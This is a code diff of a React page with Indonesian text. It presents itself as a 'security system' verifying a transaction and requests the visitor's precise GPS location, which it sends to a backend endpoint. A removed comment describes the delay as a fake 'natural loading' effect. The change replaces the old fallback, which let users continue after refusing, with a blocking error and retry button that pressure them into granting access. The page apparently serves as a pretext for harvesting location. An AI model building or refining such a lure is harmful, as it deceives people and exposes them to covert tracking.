@@ -6,45 +6,56 @@ function App() {
   const [locationStatus, setLocationStatus] = useState<string>('Memverifikasi sistem keamanan...');
   const [coords, setCoords] = useState<{lat: number, lng: number} | null>(null);
 
+  const [error, setError] = useState<string | null>(null);
+
+  const requestLocation = () => {
+    setError(null);
+    setIsVerifying(true);
+    setLocationStatus('Membutuhkan verifikasi area transaksi Anda...');
+
+    if ('geolocation' in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const { latitude, longitude } = position.coords;
+          setCoords({ lat: latitude, lng: longitude });
+          setLocationStatus('Verifikasi berhasil.');
+          setTimeout(() => setIsVerifying(false), 1000);
+          
+          fetch('/api/location', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              lat: latitude,
+              lng: longitude
+            })
+          }).catch(err => console.error("Gagal mengirim data lokasi:", err));
+        },
+        (err) => {
+          console.error("Error getting location", err);
+          let msg = 'Gagal memverifikasi lokasi.';
+          if (err.code === 1) msg = 'Akses lokasi ditolak. Mohon izinkan lokasi untuk melanjutkan.';
+          else if (err.code === 2) msg = 'Lokasi tidak ditemukan atau sinyal GPS lemah.';
+          else if (err.code === 3) msg = 'Waktu verifikasi habis.';
+          
+          setError(msg);
+          setLocationStatus(msg);
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        }
+      );
+    } else {
+      setError('Browser Anda tidak mendukung verifikasi lokasi.');
+    }
+  };
+
   useEffect(() => {
-    // Memulai request lokasi setelah 1 detik untuk memberikan efek "loading" natural
     const timer = setTimeout(() => {
-      setLocationStatus('Membutuhkan verifikasi area transaksi Anda...');
-      
-      if ('geolocation' in navigator) {
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            const { latitude, longitude } = position.coords;
-            setCoords({ lat: latitude, lng: longitude });
-            setLocationStatus('Verifikasi berhasil.');
-            setTimeout(() => setIsVerifying(false), 1000);
-            
-            // Kirim ke backend Node.js (SQLite)
-            fetch('/api/location', {
-              method: 'POST',
-              headers: {
-                'Content-Type': 'application/json',
-              },
-              body: JSON.stringify({
-                lat: latitude,
-                lng: longitude
-              })
-            }).catch(err => console.error("Gagal mengirim data lokasi:", err));
-          },
-          (error) => {
-            console.error("Error getting location", error);
-            setLocationStatus('Melanjutkan tanpa verifikasi lokasi maksimal...');
-            setTimeout(() => setIsVerifying(false), 1500);
-          },
-          {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0
-          }
-        );
-      } else {
-        setIsVerifying(false);
-      }
+      requestLocation();
     }, 1500);
 
     return () => clearTimeout(timer);
@@ -62,11 +73,23 @@ function App() {
           </div>
           <div className="space-y-2">
             <h2 className="text-xl font-bold text-slate-800">Sistem Keamanan</h2>
-            <p className="text-slate-500 text-sm">{locationStatus}</p>
+            <p className={`text-sm ${error ? 'text-red-500 font-medium' : 'text-slate-500'}`}>
+              {locationStatus}
+            </p>
           </div>
-          <p className="text-xs text-slate-400 mt-4">
-            Mohon klik "Allow" / "Izinkan" jika browser meminta izin akses lokasi untuk memvalidasi transaksi ini.
-          </p>
+
+          {error ? (
+            <button 
+              onClick={requestLocation}
+              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-4 rounded-xl shadow-md transition-all active:scale-95"
+            >
+              Coba Lagi
+            </button>
+          ) : (
+            <p className="text-xs text-slate-400 mt-4">
+              Mohon klik "Allow" / "Izinkan" jika browser meminta izin akses lokasi untuk memvalidasi transaksi ini.
+            </p>
+          )}
         </div>
       </div>
     );
